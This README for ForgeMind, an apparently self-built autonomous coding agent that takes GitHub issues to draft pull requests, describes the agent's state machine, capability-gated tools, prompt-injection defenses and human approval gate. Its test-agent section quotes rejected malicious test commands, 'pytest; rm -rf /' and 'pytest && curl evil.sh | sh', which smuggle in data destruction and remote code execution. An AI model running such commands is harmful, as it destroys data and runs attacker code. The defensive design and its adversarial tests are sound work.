# ForgeMind

Autonomous software-engineering agent: **GitHub issue → investigate → implement → test → review → PR**.

Current milestone scope:

- **Phase 1 — foundation layer**: project skeleton, config, database schema, minimal FastAPI Task API.
- **Phase 2 — task runtime**: an enforced Section-D state machine, an `execution_events` trail,
  and an arq + Redis worker that drives tasks `CREATED → PLANNING → … → COMPLETED` entirely off
  the queue.
- **Phase 3 — tool runtime**: typed tool registry, capability model, deterministic policy engine,
  and the full tool pipeline (validate → capability → policy → execute → audit) with three
  harmless example tools.
- **Phase 4 — git/repository runtime**: real filesystem access. Repository discovery (clone-once
  cache), per-task git worktrees (never touching `main`), worktree-scoped file read/list/search
  with airtight path-traversal defense, and `repository.*` / `git.*` tools wired through the
  pipeline (capability-gated, audited, fixed commit identity). No `git.push`, no `shell.*`.
- **Phase 5 — LLM provider + Planning Agent**: the first real LLM call and the first agent whose
  output drives the state machine. `llm/` abstracts providers (OpenRouter now, pluggable later)
  with strict `structured_output` (never a partially-valid object); the Planning Agent turns a
  task objective into a schema-validated plan DAG, persists it, and only then does the worker
  move PLANNING → RESEARCHING. Malformed output retries exactly once; task text is wrapped as
  DATA (prompt-injection defense); the planner has zero tool capabilities.
- **Phase 6 — Research Agent**: the first multi-turn tool-use agent. A bounded loop where the
  LLM proposes `repository.*`/`git.*` tool calls, the Phase-3 pipeline executes them under the
  researcher's fixed READ-ONLY capability set (`repo.read`, `git.read`, `github.read`), and the
  loop ends with a schema-validated `ResearchArtifact` whose file claims are cross-checked
  against what the loop actually observed. RESEARCHING → IMPLEMENTING fires only after the
  artifact is persisted. Read-only is enforced structurally (a write proposal is DENIED and
  audited, never "just tried"); file content and git output are DATA, not instructions.
- **Phase 7 — Developer Agent**: the first write-capable agent. A bounded tool-use loop that
  reads (grounded in the research artifact, but free to explore further), writes via
  `filesystem.write_file` (the Phase-4 traversal defense reused, not reimplemented), commits
  EXACTLY ONCE via `git.commit`, and ends with a schema-validated `ImplementationSummary` whose
  `files_changed` is cross-checked against the files actually written. The one-commit contract
  is enforced structurally — after the first commit, further writes/commits are denied — so the
  commit provably represents the full change. Zero commits is a HARD failure (an INCOMPLETE
  marker row, Phase 5's INVALID-plan pattern), never forced synthesis. A DENIED/unknown tool
  result is unexpected here and audited as `developer.unexpected_denial` (distinct from
  Research's expected-denial case). Capabilities exclude `shell.*`/`github.*` — verification
  is a later phase's job. IMPLEMENTING → TESTING fires only after the summary is persisted.
- **Phase 8 — Test + Debugger Agents**: the pass/fail and review/iterate branching becomes
  real. The Test Agent (`shell.run_test`, the FIRST subprocess tool) runs the repository's
  CONFIGURED test command — detected at discovery from setup-file markers, validated against
  the `command_policy` allowlist at store time, with NO agent-input path into the command at
  all (the input schema has no command field; `extra="forbid"` rejects smuggled args). It is
  deterministic (Section 41): one real subprocess run, parsed exit code + pytest counts, no
  LLM judgment. TESTING branches passed → REVIEWING / failed|error → DEBUGGING. The Debugger
  Agent investigates read-only (propose → pipeline → observation → bounded → forced
  classification), OBSERVES flakiness via exactly one re-run through the Test Agent (pass →
  FLAKY_TEST → REVIEWING, never blocking the pipeline but never silently dropped), and
  classifies CODE_FAILURE/TEST_FAILURE/ENVIRONMENT_FAILURE/DEPENDENCY_FAILURE/UNKNOWN with a
  CONCRETE fix instruction. Fixable → IMPLEMENTING with `replan_count`+1 enforced at the
  transition (`max_replans` exhausted → ESCALATED); unfixable → FAILED with the category
  attached. Timeouts are status "error" (distinct from "failed") so a hung suite is never
  confused with a clean failing exit code.
- **Phase 9 — Reviewer + Security Agents**: REVIEWING → SECURITY_REVIEW → VERIFICATION become
  real. The Reviewer independently critiques the developer's commit (correctness,
  architecture, test quality, regressions) from the commit diff + test result ONLY — the
  ImplementationSummary is never passed in (the agent's run signature has no summary
  parameter, so the independence is structural, not instructional); it can genuinely
  REJECT/REQUEST_CHANGES, and does so in tests. The Security Agent runs a checklist
  (injection, secrets, unsafe subprocess/network, path traversal, auth/authz) on the same
  commit, blind to the Reviewer's verdict. REVIEWING branches APPROVE → SECURITY_REVIEW /
  REQUEST_CHANGES|REJECT → IMPLEMENTING; SECURITY_REVIEW branches PASS → VERIFICATION / FAIL
  → IMPLEMENTING — both replans draw from the ONE shared `max_replans` budget via a single
  replan path, with the fix instruction labeled by source (`[REVIEWER …]`/`[SECURITY]`,
  never merged/ambiguous). VERIFICATION is a plain-code staleness check (no LLM): the
  reviewed commit must still be worktree HEAD and the last test run still passed, else back
  to TESTING (stale review).
- **Phase 10 — GitHub Agent + PR runtime**: the mission's finishing move — the task's
  verified branch lands as a real DRAFT pull request on a FORK, and the human gets a
  blocking checkpoint. `git.push` (the ONLY push in the system) force-pushes the task branch
  to `repositories.fork_url` — unset or upstream-identical fork fails closed, and the token
  is embedded per-invocation (`x-access-token`) with the argument list redacted, never
  persisted to git config. `github.create_pr` is the first HIGH-risk tool and the phase's
  approval-gated surface: its target is resolved server-side (no `owner`/`repo`/`head`/`base`
  input exists at all), it opens a DRAFT by construction, and there is no `github.merge`
  tool, capability, or client method anywhere (the policy engine also denies it by name) —
  merging stays a manual action. The GitHub Agent is deterministic (no LLM): push → draft PR
  whose body is a plain-code readout of the PERSISTED artifacts (plan, research,
  implementation, test, review, security) → best-effort comment on the source issue (a
  comment failure never fails the task) → persist the `pull_requests` row — and only then
  does PR_CREATION → AWAITING_APPROVAL fire. The human decides via
  `POST /tasks/{id}/approve|reject`: approve → COMPLETED (merging remains yours, on GitHub),
  reject → FAILED deliberately (a human stop, never an auto-replan).

## Quick start

```bash
# 1. Postgres + Redis + worker (worker runs migrations on boot)
docker compose up -d --wait

# 2. Environment
cp .env.example .env

# 3. Install
python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate
pip install -e ".[dev]"

# 4. Migrate (if you didn't let the worker container do it)
alembic upgrade head

# 5. Run the API
uvicorn app.main:app --reload

# (the worker is already running in Docker; or run it locally:)
# arq app.worker.worker.WorkerSettings
```

Then:

```bash
curl -X POST localhost:8000/tasks \
  -H 'Content-Type: application/json' \
  -d '{"objective": "Fix the flaky test in auth", "repository_url": "https://github.com/org/repo.git", "fork_url": "https://github.com/you/org-fork.git"}'
# -> 201 {"id": "...", "status": "CREATED", ...}  (advance_task job enqueued)

curl localhost:8000/tasks                # list
curl localhost:8000/tasks/{id}           # fetch one — watch status walk to AWAITING_APPROVAL
curl localhost:8000/tasks/{id}/events    # ordered execution-event trail
curl -X POST localhost:8000/tasks/{id}/cancel   # -> FAILED (user_cancelled); 409 on terminal tasks
curl -X POST localhost:8000/tasks/{id}/approve  # human checks out the draft PR, then approves -> COMPLETED
curl -X POST localhost:8000/tasks/{id}/reject   # human rejects -> FAILED (deliberate stop)
curl localhost:8000/health               # {"status": "ok"}
```

## Tests

```bash
pytest              # hermetic suite (SQLite, no services) — state machine, lifecycle, API,
                    # policy engine, path traversal (read + write), git runtime, planner,
                    # research + developer + tester + debugger + reviewer + security agents,
                    # plus the Phase 10 github.*/git.push tools, GitHub client + stub,
                    # PR template, GitHub Agent, and the approve/reject API
pytest tests_e2e/   # end-to-end (needs Postgres + Redis up) — real worker pipeline, cancel,
                    # crash recovery (kill/restart), two-worker concurrency, full agent loops
                    # (REAL subprocess test runs, review reject-then-approve, security fail-
                    # then-pass, verification staleness, PR_CREATION -> AWAITING_APPROVAL
                    # -> human approval; real-GitHub e2e is env-gated on a GITHUB_TOKEN)
```

Note: `tests_e2e/` spawns its OWN worker subprocesses on the same Postgres/Redis, so stop the
compose worker first (`docker compose stop worker`) — an extra always-on worker races the test
workers (both sweep the same tasks). This is a test-harness constraint, not a product issue.

## Layout

```
app/
  agents/
    base.py                 Agent ABC + shared structured_output_with_retries
    planner/                PlanningAgent: prompt (data-not-instructions), Plan schema +
                            DAG validation, retry-once, persistence
    researcher/             ResearchAgent: bounded tool-use loop (read-only), ResearchArtifact
                            schema + grounding cross-check, forced synthesis on budget exhaustion
    developer/              DeveloperAgent: bounded write-capable loop, one-commit contract,
                            ImplementationSummary schema + files-changed cross-check
    tester/                 TestAgent: deterministic shell.run_test + pytest parser (no LLM)
    debugger/               DebuggerAgent: read-only investigation + flakiness re-run +
                            FailureClassification (category, root cause, fix instruction)
    reviewer/               ReviewerAgent: read-only loop critiquing the commit diff + test
                            result only (structural independence from the developer's summary)
    security/               SecurityAgent: read-only checklist scan (injection, secrets,
                            subprocess/network, traversal, auth/authz) — blind to the verdict
    github_agent/           GitHubAgent (deterministic, no LLM): push task branch to the fork,
                            open a DRAFT PR from persisted artifacts, comment the source issue,
                            persist the pull_requests row
  api/routes/tasks.py       Task API: create/list/get/cancel/events + approve/reject
  capabilities/             Capability value objects + per-agent assignment (Section H)
  database/                 engine/session + Alembic migrations
  execution/tool_pipeline.py  validate -> capability -> policy -> execute -> audit
  git/
    runner.py               git subprocess runner (arg lists only, fixed identity, no prompts)
    operations.py           status/diff/log/create_branch/push/commit on a worktree
                            (push is the only push in the system — fork-only, force, redacted)
    worktree_manager.py     per-task worktrees (create/discard/path_for) — the only branch creator
  github/
    client.py               thin GitHub REST wrapper (httpx, error taxonomy, retry seam)
    stub.py                 deterministic in-memory client (FORGEMIND_MOCK_GITHUB=1)
    slug.py                 GitHub URL -> owner/repo parsing (server-side seam)
  llm/
    provider.py             LLMProvider ABC + parse/validate (strict structured_output)
    openrouter.py           OpenAI-compatible provider (httpx, timeouts -> LLMTimeoutError)
    mock.py                 deterministic stub provider (tests / key-less dev)
    config.py               role -> model from env (LLM_MODEL_PLANNER, ...)
  models/                   SQLAlchemy models (Section-G schema) + ExecutionEvent + ToolCall
  policies/                 deterministic PolicyEngine + risk-default & explicit-deny rules
  repository/
    discovery.py            clone-once cache + test-command detection/validation (Phase 8)
    file_access.py          worktree-scoped read/list/search/write — traversal-safe
  runtime/
    state_machine.py        Section-D legal-transition table — pure logic, no I/O
    task_lifecycle.py       transitions + events + stub driver + agent transitions
                            (advance_task_with_agents) with compare-and-swap re-check
  schemas/                  Pydantic request/response schemas
  shell/
    command_policy.py       test-command allowlist + argument validation (Phase 8)
    runner.py               subprocess execution: arg list only, timeout, captured output
  tools/                    Tool ABC + registry + example tools + repository.* / git.* /
                            filesystem.* / shell.* / github.* tools
  worker/
    queue.py                arq Redis settings + pool + enqueue helper
    jobs/advance_task.py    one job = one transition (PLANNING/RESEARCHING/IMPLEMENTING/
                            TESTING/DEBUGGING/REVIEWING/SECURITY_REVIEW run the real agents)
    worker.py               arq entrypoint + startup sweep (crash recovery)
  config.py                 env-driven settings (secrets never hardcoded/logged)
  logging.py                logging setup with URL redaction
  main.py                   FastAPI app + /health + fail-fast DB check
tests/                      hermetic suite (SQLite + real local git repos + stubbed LLM)
tests_e2e/                  end-to-end suite (Postgres + Redis + worker subprocesses)
```

## Tool pipeline (architecture doc sections F/H)

Every tool invocation goes through `app/execution/tool_pipeline.py`:

```
validate input -> capability check -> policy check -> execute -> audit
```

- **Exactly one `tool_calls` row per invocation**, whatever the outcome
  (DENIED / EXECUTED / FAILED; ALLOWED is the transient admit state).
- **Fail-closed policy engine**: pure functions over typed input, no LLM;
  any rule's DENY wins over any ALLOW vote.
- **Secrets redacted** from stored input/output (`redact_sensitive`) — the
  structured-data analogue of the Phase-1 URL redaction.
- Contract errors (unknown tool, malformed input) raise loudly and never
  execute or write a row.

Example tools prove the paths: `example.echo` (executes), `example.read_file`
(denied without `repo.read`), `example.denied` (denied by explicit policy).

## LLM provider + Planning Agent (Phase 5)

- **`llm/` provider abstraction**: `structured_output` either returns a fully-valid object or
  raises `LLMMalformedOutputError` with the raw output attached — malformed JSON and
  valid-JSON-with-wrong-shape are both rejected. Models are per-role env vars
  (`LLM_MODEL_PLANNER`), never hardcoded. `FORGEMIND_MOCK_LLM=1` runs a deterministic stub
  provider (tests / key-less dev); a configured `OPENROUTER_API_KEY` always wins.
- **Planning Agent**: task objective in → schema-validated plan DAG out → persisted to
  `plans`/`plan_steps` (raw output in `plans.raw_llm_output`) → PLANNING → RESEARCHING fires
  only after that. DAG rules: unique ids, no dangling deps, no cycles, every implement step
  has a research ancestor.
- **Retry boundary**: transient errors (timeout, 429/5xx) retry with bounded backoff; the
  malformed/invalid retry happens exactly ONCE with a correction prompt; a second failure
  raises and the task goes FAILED (never ESCALATED), raw output preserved.
- **Prompt injection**: task objective/repo metadata sit in a `<reference_data>` block and the
  system prompt declares them DATA, not instructions. Tests feed injection-style objectives
  and prove the injected payload can never become a persisted plan.
- **Planner capabilities are structurally empty** — it cannot invoke any tool.

## Test + Debugger Agents (Phase 8)

- **`shell.run_test` — locked down by construction**: the tool's input schema has NO command
  field. The command comes exclusively from `repositories.test_command`, detected at discovery
  time from the repo's own setup files (`pyproject.toml`/`pytest.ini`/`package.json`/`go.mod`/
  `Cargo.toml` → `pytest`/`npm test`/`go test`/`cargo test`), validated against the
  `command_policy` allowlist when stored (a rejected value fails discovery loudly, never gets
  stored), and re-validated by the runner before every execution. Malicious commands
  (`pytest; rm -rf /`, `pytest && curl evil.sh | sh`) are rejected at the allowlist/metachar/
  path-escape checks. Since there is no agent-input path into the command at all, injection is
  provably impossible — the adversarial test proves there is nothing to inject into.
- **Test Agent is deterministic** (Section 41): one `shell.run_test` call, parse the exit code
  and pytest summary line, persist a `TestRun` (status passed/failed/error, counts, exit code,
  duration, truncated output, `timed_out` flag). No LLM call anywhere in this agent. A hang
  times out into `error` (never `failed`), so the Debugger can tell a hung suite from a clean
  failing exit code. No validated `test_command` → a clear error at invocation, not a
  confusing subprocess failure.
- **TESTING branches for real**: `passed` → REVIEWING (`tests_passed`); `failed`/`error` →
  DEBUGGING (`tests_failed`/`tests_error`). The old stub happy-path note is gone — this is the
  phase where `next_status`'s pass/fail branch finally becomes real.
- **Debugger: read-only, flakiness OBSERVED not guessed**: the Debugger re-runs the suite
  EXACTLY ONCE via the Test Agent before classifying. If the re-run passes → FLAKY_TEST,
  set deterministically (the LLM is never allowed to guess "flaky" from one run); the flake
  is flagged in the trace (`debugger.flaky_detected`) and routed to REVIEWING as if TESTING
  had passed. A re-run that fails DIFFERENTLY (timeout vs clean exit) is not "flaky" —
  classified from the more informative run, inconsistency noted in `root_cause`.
- **Classification drives the branching**: categories are CODE_FAILURE / TEST_FAILURE /
  ENVIRONMENT_FAILURE / DEPENDENCY_FAILURE / FLAKY_TEST / UNKNOWN, with a CONCRETE
  `fix_instruction` handed to the Developer's next run as DATA (never "fix the error").
  `fixable=False` → FAILED with the category attached (an environment/dependency failure is
  not something re-running the Developer fixes). Fixable → IMPLEMENTING with `replan_count`+1
  — the budget is enforced AT THE TRANSITION (the Developer never sees it); exhausted →
  ESCALATED, not another attempt.
- **Denials are Research-style here**: the Debugger is read-only by contract, so a write
  proposal is a benign mistake (absorbed as an observation, still audited
  `debugger.unexpected_denial`) — NOT Developer-style unexpected behavior.

## Reviewer + Security Agents (Phase 9)

- **Independence is structural, not instructional**: the Reviewer's `run` signature takes
  `commit_sha` + `test_result` — there is NO ImplementationSummary parameter, and the prompt
  builder has no summary field, so the developer's self-reported story cannot be threaded
  into the review without changing the function signature. Security is one step further:
  `run` takes only `commit_sha`, blind to the Reviewer's verdict too. The independence test
  is the phase's most important one: a plausible-sounding summary + a diff with a real
  problem — the Reviewer must flag the diff-level problem because the summary text is
  structurally absent.
- **Both are read-only loops** (propose → pipeline → observation → bounded → forced
  synthesis, the Phase 6/8 skeleton). A write proposal is DENIED and audited
  `reviewer.unexpected_denial` / `security.unexpected_denial` (Developer-style unexpected,
  not Research-style benign — neither agent has a legitimate reason to probe write access).
- **REVIEWING branches for real**: APPROVE → SECURITY_REVIEW; REQUEST_CHANGES/REJECT →
  IMPLEMENTING through the shared replan path with the issues as the fix instruction
  (`[REVIEWER REQUEST_CHANGES] …`). SECURITY_REVIEW: PASS → VERIFICATION; FAIL →
  IMPLEMENTING with the findings as the fix instruction (`[SECURITY] …`) — the developer's
  next run clearly sees WHICH gate failed and why, never a merged/ambiguous instruction.
- **One shared replan budget**: Debugger, Reviewer, and Security replans all go through
  `_replan_to_implementing` — one `max_replans` on the task row (Section 42), counted once,
  enforced at the transition (exhausted → ESCALATED). Two consecutive replans from different
  sources accumulate correctly (tested); there is deliberately no per-source budget.
- **VERIFICATION is plain code, no LLM** — a staleness check that the approval is still
  valid: the reviewed commit must still be the worktree HEAD (a replan could have landed a
  new commit) AND the last test run must still be `passed`. Either failing → back to TESTING
  (`stale_review`), never proceeding on an invalidated approval. Tested both ways: pass-
  through, and a simulated stale commit caught by the HEAD check.
- **Security's checklist is tested against planted examples**: injection, secrets, unsafe
  subprocess/network, path traversal, auth/authz — one deliberately planted finding per
  category in a test diff, each caught by the (mocked-LLM) Security agent.

## GitHub Agent + PR runtime (Phase 10)

The mission's last step — the verified branch becomes a real DRAFT pull request on a FORK,
and a human signs off.

- **`app/github/` — the thin REST wrapper**: `slug.py` parses GitHub URLs into `owner/repo`
  (the server-side seam); `client.py` is the httpx wrapper with an error taxonomy
  (auth / not-found / validation / rate-limit / transport) and bounded transient retry
  (429 / 403-with-exhausted-limit honour `Retry-After`); `stub.py` is the deterministic
  in-memory client for tests and key-less dev (`FORGEMIND_MOCK_GITHUB=1`); `__init__.py`
  chooses mock > token > None — no configured token means PR_CREATION fails cleanly instead
  of hanging, and there is deliberately NO `merge` method anywhere on the client.
- **`git.push` — the only push in the system**: force-pushes the worktree branch to
  `repositories.fork_url`. HTTPS auth embeds the PAT as `x-access-token` for that single
  invocation — never persisted to a git remote config — and the argument list is redacted
  from error messages, so the credential can never reach a log line. An unset fork or an
  upstream-identical fork (`fork_url == url`) FAILS CLOSED: the upstream reference is for
  READS only, never a push/PR target.
- **`github.*` tools** (enforced in code, never by convention):
  `github.get_issue` (read, LOW), `github.comment_issue` (write, MEDIUM),
  `github.create_pr` (write, HIGH — the phase's approval-gated surface). Every tool resolves
  its target SERVER-SIDE from the task's repository row; `create_pr`'s input is just
  `{worktree_id, title, body}` with `extra="forbid"`, so a smuggled `owner`/`repo`/`head`/
  `base` field is rejected at validation — there is no caller-supplied path to redirect the
  PR. It opens a DRAFT PR onto the fork's default branch, by construction.
- **No merge anywhere**: no `github.merge` tool, capability, or client method in the whole
  codebase, and the policy engine denies `github.merge` by name as a second layer. Nothing
  ForgeMind writes can ever merge — merging is the human's manual action on GitHub.
- **GitHubAgent** (`github`, deterministic — the Test Agent pattern, NO LLM): push → draft
  PR whose body is assembled from the PERSISTED artifacts (objective, plan steps, research
  hypothesis, implementation summary + files changed, last test run, reviewer verdict,
  security verdict, then a "draft, pending human approval" note) → best-effort comment on
  the source issue (a failure is audited, never fails the task) → persist the
  `pull_requests` row. An absent artifact simply omits its section — nothing is invented on
  a page a human will trust.
- **The human checkpoint**: PR_CREATION → AWAITING_APPROVAL fires only after the PR row is
  persisted. AWAITING_APPROVAL is TERMINAL-UNTIL-HUMAN — the worker never auto-advances it.
  `POST /tasks/{id}/approve` → COMPLETED (records an `approvals` row; merging stays manual);
  `POST /tasks/{id}/reject` → FAILED — a deliberate stop, never an auto-replan back in. Both
  are row-locked (409 unless the task is actually AWAITING_APPROVAL) and mirror the PR row's
  status into the PR-status vocabulary (`approved`/`rejected`) — the PR row NEVER claims a
  merge.

**Decisions recorded (this phase's report):**

1. **Worktree status on approval — left `active`, deliberately untouched.** On
   `approve → COMPLETED` no worktree field is written. The `merged` status vocabulary is
   reserved for an actual git merge, which this system never performs — since merging is
   manual on GitHub, the worktree's status reflects what ForgeMind did (pushed a branch,
   opened a PR), never what the human may do later. We never reuse `merged` for anything
   short of a real merge; a future merge-capable or discard-on-approval phase will make that
   change explicitly.
2. **Adversarial fork-vs-upstream tests pass.** The hermetic suite proves the split is
   enforced by construction: unset `fork_url` fails `create_pr` closed; `fork_url == url`
   raises SecurityError; a smuggled `owner`/`repo`/`head`/`base` is rejected at validation;
   and the suite asserts there is NO `github.merge` tool in the registry at all.
3. **The approve/reject endpoints are unauthenticated — a known gap.** This is deliberate
   for the single-operator MVP: there are no user accounts yet, so any caller who can reach
   the API can approve. It is flagged in the code and here; auth/authz is the first thing a
   multi-user build must add.
4. **Draft-PR-as-second-layer felt sufficient for the MVP.** The gate is not the PR review —
   it is AWAITING_APPROVAL plus the structural fact that the system physically cannot merge.
   The draft adds a real place for human review on GitHub's own surface before the operator
   approves. One accepted consequence: the operator may merge the PR after approving, and the
   task is already COMPLETED — the completed task means "ForgeMind delivered a reviewed,
   approved draft PR," not "the merge happened."

## Developer Agent (Phase 7)

- **Bounded tool-use loop, write-capable**: the LLM proposes ONE tool call per turn
  (`repository.*`, `filesystem.write_file`, `git.status`/`diff`/`log`/`commit`); the pipeline
  executes it under the developer's fixed capability set (`repo.read`, `repo.write`, `git.read`,
  `git.write`); results feed back as `<observation>` DATA; repeat up to
  `MAX_DEVELOPER_TOOL_CALLS` (default 20). A `{"final": true}` response ends the loop and the
  runtime asks for the `ImplementationSummary`.
- **One commit per run, enforced structurally**: after the first successful `git.commit`, any
  further `filesystem.write_file`/`git.commit` proposal is denied at the agent level (audited
  `developer.post_commit_proposal`) — so the single commit provably represents the full change
  and no uncommitted residue can accumulate. (Chosen over allow-and-squash: squashing needs
  fragile history surgery; structural enforcement gives a Reviewer one unambiguous commit.)
- **Zero commits = hard failure**: an LLM that says `final` (or exhausts the budget) without
  committing raises, the task goes FAILED, and an explicit INCOMPLETE marker row is persisted
  (Phase 5's INVALID-plan-row pattern) — an implementation with no commit is nothing, not a
  degraded-but-usable artifact.
- **Grounding cross-check**: the summary's `files_changed` must match the files ACTUALLY
  written by `filesystem.write_file` during the loop (same accept-with-warning-after-one-retry
  policy as Phase 6, applied to writes — the committed diff is verifiable ground truth
  downstream). Unexplained divergences from `research.relevant_files` are prompted once
  (`deviations_from_research`), then accepted with a loud audit if the LLM still stays silent.
- **Write-path security**: `filesystem.write_file` reuses `FileAccess._resolve` — the exact
  Phase-4 containment check — so a `../` climb, absolute path, or symlink escape is rejected
  before anything is written, with its own adversarial test.
- **Unexpected denials are loud**: the developer holds every capability it legitimately needs,
  so a pipeline DENIED result or an unknown `shell.*`/`github.*` proposal is audited as
  `developer.unexpected_denial` — distinct from Research's expected-denial case. The capability
  boundary (no `shell.*`, no `github.*`) is verified adversarially.
- **Empty-diff commits are handled, not looped**: `git.commit` refuses empty trees (Phase 4);
  the refusal is a FAILED observation the loop survives — never an infinite retry.
- **Research is a hypothesis, not ground truth**: findings are handed over with an explicit
  disclaimer, and the developer may explore beyond `relevant_files` — as long as it explains
  the divergence.

## Research Agent (Phase 6)

- **Bounded tool-use loop**: the LLM proposes ONE tool call per turn (`repository.search`,
  `read_file`, `list_files`, `git.status`/`diff`/`log`); the pipeline executes it under the
  researcher's fixed read-only capability set; results are fed back as `<observation>` DATA;
  repeat up to `MAX_RESEARCH_TOOL_CALLS` (default 10). A `{"final": true}` response ends the
  loop and the runtime asks for the `ResearchArtifact`.
- **Read-only is structural**: the capability set is `repo.read`/`git.read`/`github.read` — a
  write proposal (e.g. `git.commit`) is DENIED by the pipeline and audited, and the loop
  survives (the denial becomes an observation).
- **Grounding cross-check**: the artifact's `relevant_files`/`relevant_tests` must have been
  observed during the loop (read/searched/listed). Fabricated claims are rejected once with a
  correction prompt; if the retry still lies, the artifact is accepted WITH a loud
  `artifact.files_unverified` audit entry (a wrong file in a hypothesis is recoverable
  downstream; failing the whole task over it is not).
- **Budget exhaustion**: an LLM that never says `final` is hard-stopped at the budget, audited
  (`research.budget_exhausted`), and forced into synthesis — never an infinite loop.
- **Prompt injection**: file contents and git output are untrusted DATA like the issue text;
  an injection inside a file cannot fabricate grounding (the cross-check rejects it).
- **Concurrency-safe worktree/clone**: two workers racing the same task (research commits
  mid-transaction, releasing the row lock) are handled by compare-and-swap transitions and
  idempotent clone/worktree creation — one transition per state, no spurious failures.

## Git/repository runtime (Phase 4)

- **One clone per repo**, cached at `repositories.local_clone_path` (`--no-checkout`, so no
  default-branch working tree exists on disk at all). Per-task worktrees via
  `git worktree add -b agent/task-{id}` from the default-branch HEAD — the only place a branch
  is created; nothing ever commits to or checks out `main`.
- **Server-side path resolution**: every file/git tool takes a `worktree_id`; paths resolve
  against the worktree root and anything escaping it (`../`, absolute, symlink escape) raises
  `PathTraversalError` (a `SecurityError`) before any read. Traversal is logged as a
  security-relevant event and surfaces as a FAILED tool call.
- **Commits** stage all changes (`git add -A`) and refuse empty trees, with a fixed identity
  (`ForgeMind Agent <agent@forgemind.local>`) — agent input can never set authorship.
- **Discard** (`git worktree remove --force` + branch delete) enables Section J's
  "discard and recreate from base_commit" recovery path — recreated worktrees start byte-
  identical to the original.
- `git.*`/`repository.*` tools are capability-gated (`repo.read`, `git.read`, `git.write`),
  risk-tiered, and fully audited by the Phase 3 pipeline.

## State machine (architecture doc section D)

Transitions are enforced by a deterministic lookup table (`runtime/state_machine.py`),
never by asking the LLM "are we done?" Illegal transitions raise `IllegalTransitionError`
and are logged — `tasks.status` is never silently updated. Every applied transition writes an
`execution_events` row in the same transaction, so a crash mid-run always leaves the task at
its last persisted status; the worker's startup sweep re-enqueues it from there.

## Schema

Tables (architecture doc section G, milestone scope): `tasks`, `plans` (incl.
`raw_llm_output`), `plan_steps`, `task_steps`, `capabilities`, `policies`, `audit_logs`,
`repositories` (incl. `local_clone_path` and Phase 10's `fork_url`), `worktrees`,
`execution_events`, `tool_calls`, `research_artifacts`, `implementation_summaries`,
`test_runs`, `failures`, `failure_classifications`, `review_results`, `security_results`,
`pull_requests`, `approvals`. Remaining Section-G tables arrive with the phases that use
them (agents/eval). Tasks default to a bounded replan budget
(`max_replans=3`) — Section D's "budget exhausted → ESCALATED" is enforced even when the API
client sets no budget.

## Security posture

- Secrets come from `.env` only; connection strings are logged redacted.
- Startup fails fast if the DB is unreachable — no silent hangs.
- The worker uses the same env-driven config as the API — no new secret surface.
- Shell execution is confined to ONE tool (`shell.run_test`) running the repository's
  allowlist-validated test command as an argument list (never `shell=True`) with a hard
  timeout and captured output — there is no agent-input path into the command at all; file
  writes are confined to the task's worktree (traversal-rejected), never outside the repo.
- External network (Phase 10) is confined to the GitHub REST API and a push to the
  operator's FORK — `repositories.url` is for READS only, and a push/PR target must come
  from `repositories.fork_url` (fail-closed, never the upstream). The only credential,
  `GITHUB_TOKEN`, is embedded per-invocation and redacted from every log/audit path; nothing
  ForgeMind writes can merge a PR (no `github.merge` exists at all).
